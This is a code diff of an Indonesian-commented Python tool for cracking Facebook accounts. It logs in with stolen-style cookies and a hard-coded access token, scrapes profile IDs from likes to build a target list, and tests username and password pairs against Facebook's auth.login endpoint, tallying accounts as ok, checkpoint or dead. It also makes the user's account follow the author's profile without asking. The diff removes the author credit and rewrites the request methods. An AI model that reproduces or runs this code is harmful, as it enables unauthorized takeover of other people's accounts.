@@ -1,9 +1,7 @@
-#!/usr/bin/env python3
+#!/usr/bin/python
 # -*- coding: utf-8 -*-
 #Males gw encrypt Tod jika mau recode, recode aja
 #Tapi ngotak dikit jangan Lo jual belikan sc ini kontol
-#Code by Syafii-XD
-#Created 05-07-2022
 #My facebook (https://www.facebook.com/fikritampan305)
 
 import os,sys,re,time,json,random,requests
@@ -83,7 +81,7 @@ def moch_yayan():
                    cek = input("\n\033[0;92m       [ \033[0;97mThis Tool Use Facebook Cookies \033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
                    print('\n\033[97m [\033[92m+\033[97m] \033[92mPleas Wait...')
              cek = {"cookie":cek}
-             ismi = ses.post(mbasic.format("/me",verify=False),cookies=cek).content
+             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
              if "mbasic_logout_button" in str(ismi):
                      if "Apa yang Anda pikirkan sekarang" in str(ismi):
                              with open("cookies","w") as f:
@@ -91,24 +89,24 @@ def moch_yayan():
                      else:
                            print("\033[1;97m[\033[1;94m•\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
                            try:
-                                  requests.Session().post(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
+                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                            except:
                                   pass
                      try:
-                             ikuti = parser(requests.Session().post(mbasic.format("/fikritampan305"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
-                             ses.post(mbasic.format(ikuti),cookies=cek)
+                             ikuti = parser(requests.get(mbasic.format("/fikritampam305"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                             ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
                              pass
                      return cek["cookie"]
                      aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
              else:
-                  os.system("xdg-open https://youtube.com/channel/UCmIo6prErfz0OhEQ9fQq4JQ") 
+                  os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
                   os.system('rm -rf cookies')
                   print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
                   os.system('python Cr4ck.py')
          def login(username,password,cek=False):
              global die,check,result,count
-             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
+             b = "100004623370585%7C62f8ce9f74b12f84c123cc23437a4a32"
              params = {
                      'access_token': b,
                      'format': 'JSON',
@@ -120,8 +118,8 @@ def moch_yayan():
                      'generate_session_cookies': '1',
                      'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
              }
-             api = 'https://b-api.facebook.com/method/auth.login'
-             response = requests.Session().post(api, params=params)
+             mobile = 'https://mobile.facebook.com/method/auth.login'
+             response = requests.get(mobile, params=params)
              if 'EAA' in response.text:
                  print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
                  print()
@@ -146,7 +144,7 @@ def moch_yayan():
                             print(f"\r\033[00m [\033[1;91m{i}\033[00m] ok : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
                             time.sleep(0.2)
          def getid(url):
-             raw = requests.Session().post(url,cookies=kuki).content
+             raw = requests.get(url,cookies=kuki).content
              getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
              for x in getuser:
                  if 'profile' in x[0]:
@@ -161,14 +159,14 @@ def moch_yayan():
              return id
          def fromlikes(url):
              try:
-                  like = requests.Session().post(url,cookies=kuki).content
+                  like = requests.get(url,cookies=kuki).content
                   love = re.findall('href="(/ufi.*?)"',str(like))[0]
                   aws = getlike(mbasic.format(love))
                   return aws
              except:
                   exit(" \033[1;97m [\033[1;94m•\033[1;97m] Link Not Found!")
          def getlike(react):
-             like = requests.Session().post(react,cookies=kuki).content
+             like = requests.get(react,cookies=kuki).content
              ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
              for user in ids:
                  if 'profile' in user[0]:
